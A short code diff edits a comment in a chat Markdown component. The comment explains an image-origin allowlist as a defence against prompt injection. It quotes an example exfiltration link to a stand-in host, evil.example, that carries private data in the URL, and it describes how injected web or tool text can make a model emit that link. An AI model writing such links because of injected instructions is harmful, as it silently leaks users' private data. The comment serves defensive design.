@@ -315,7 +315,7 @@ const ai_chat_markdown_components = {
 
 /**
  * Only these origins may load images in chat Markdown: the app and the R2 host that serves
- * Press media. Chat text can repeat web pages, search results, or tool output, so injected text
+ * Bonobo Senate media. Chat text can repeat web pages, search results, or tool output, so injected text
  * can make the model write `![x](https://evil.example/?d=<private data>)`. The browser would load
  * that image at once and send the data, with no click and no approval.
  */
